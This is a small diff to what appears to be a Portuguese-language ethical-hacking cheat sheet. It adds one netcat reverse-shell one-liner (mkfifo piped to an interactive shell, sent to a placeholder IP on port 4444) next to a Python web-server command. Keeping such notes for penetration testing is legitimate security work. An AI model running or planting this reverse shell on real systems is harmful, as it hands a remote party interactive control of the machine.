@@ -49,6 +49,10 @@ Encontre aqui notas e comandos de um HACKER ÉTICO
 	
 .
 
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f
+
+.
+
 	python3 -m http.server 8080
 
 .
